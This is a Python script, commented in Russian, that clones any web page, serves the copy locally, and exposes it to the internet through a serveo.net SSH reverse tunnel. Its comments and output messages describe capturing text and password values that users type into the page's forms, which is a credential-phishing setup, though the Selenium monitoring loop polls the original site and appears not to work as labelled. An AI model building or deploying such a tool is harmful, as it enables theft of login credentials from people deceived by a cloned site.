import os
import requests
import subprocess
import time
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# Отключаем вывод логов Serveo в терминале
serveo_command = "ssh -q -R 80:localhost:8000 serveo.net -T > serveo_log.txt 2>&1"
serveo_process = subprocess.Popen(serveo_command, shell=True)

# Введите URL
url = input('\nВыбери URL ➤ ')

# Проверяем, что URL не пустой
if url.strip():
    # Скачиваем страницу по ссылке
    response = requests.get(url)
    html_content = response.text

    # Преобразуем относительные ссылки в абсолютные
    soup = BeautifulSoup(html_content, 'html.parser')
    base_url = response.url

    def make_absolute_links(tag, attribute):
        if not tag[attribute].startswith(('http://', 'https://', '//')):
            tag[attribute] = urljoin(base_url, tag[attribute])

    # Преобразуем относительные ссылки
    for tag in soup.find_all(['a', 'link'], href=True):
        make_absolute_links(tag, 'href')

    for tag in soup.find_all(['img', 'script'], src=True):
        make_absolute_links(tag, 'src')

    for tag in soup.find_all('img', {'data-src': True}):
        make_absolute_links(tag, 'data-src')

    # Ждем некоторое время перед сохранением HTML-кода
    time.sleep(5)

    # Добавляем JavaScript-скрипт для обработки асинхронной загрузки изображений
    script = """
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            var lazyImages = document.querySelectorAll('img[data-src]');
            lazyImages.forEach(function(img) {
                img.setAttribute('src', img.getAttribute('data-src'));
            });
        });
    </script>
    """

    # Вставляем скрипт в конец HTML-страницы
    soup.body.append(BeautifulSoup(script, 'html.parser'))

    # Проверяем наличие форм для ввода данных и выводим данные, вводимые пользователями
    forms = soup.find_all('form')
    if forms:
        print("Найдены формы для ввода данных.")
        for form in forms:
            inputs = form.find_all('input')
            if inputs:
                print("Найдены поля для ввода данных в форме.")
                for inp in inputs:
                    inp_type = inp.get('type')
                    inp_name = inp.get('name')
                    if inp_type in ['text', 'password']:
                        print(f"Пользователь ввел данные в поле '{inp_name}': {inp.get('value')}")

    # Сохраняем HTML-код в файл
    file_path = 'downloaded_page.html'
    with open(file_path, 'w', encoding='utf-8') as file:
        file.write(str(soup.prettify()))  # Используем prettify для более красивого форматирования

    print(f"Страница успешно скачана и сохранена в файл {file_path}")

    # Шаг 2: Запуск локального сервера

    # Создаем копию soup для сохранения в index.html
    soup_copy = soup

    # Копируем содержимое файла в файл index.html в текущей рабочей директории
    with open('index.html', 'w', encoding='utf-8') as file:
        file.write(str(soup_copy.prettify()))

    # Выполняем команду для запуска локального сервера на порту 8000 (или другом свободном порту)
    local_server_command = 'python -m http.server 8000'

    # Запускаем команду для локального сервера с помощью subprocess
    local_server_process = subprocess.Popen(local_server_command, shell=True, stdout=subprocess.PIPE)

    # Печатаем сообщение о запуске локального сервера
    print("Локальный сервер запущен на порту 8000")

    # Шаг 3: Запуск Selenium для мониторинга данных на сайте в реальном времени
    chrome_options = Options()
    chrome_options.add_argument("--headless")  # Запускаем браузер в режиме без GUI
    driver = webdriver.Chrome(options=chrome_options)

    driver.get(url)

    try:
        while True:
            # Получаем значения полей форм в реальном времени
            forms = driver.find_elements_by_tag_name('form')
            if forms:
                for form in forms:
                    inputs = form.find_elements_by_tag_name('input')
                    if inputs:
                        for inp in inputs:
                            inp_type = inp.get_attribute('type')
                            inp_name = inp.get_attribute('name')
                            inp_value = inp.get_attribute('value')
                            if inp_type in ['text', 'password'] and inp_value:
                                print(f"Пользователь ввел данные в поле '{inp_name}': {inp_value}")

            time.sleep(1)
    except KeyboardInterrupt:
        # Прерываем выполнение при нажатии Ctrl+C

        # Завершаем процессы локального сервера и Serveo.net
        local_server_process.terminate()
        serveo_process.terminate()

        # Закрываем браузер Selenium
        driver.quit()

        # Удаляем все скачанные файлы
        for filename in ['index.html', 'downloaded_page.html']:
            if os.path.exists(filename):
                os.remove(filename)
        print("Скрипт завершен. Все скачанные файлы удалены.")
else:
    print("Пустой URL. Пожалуйста, введите действительный URL.")
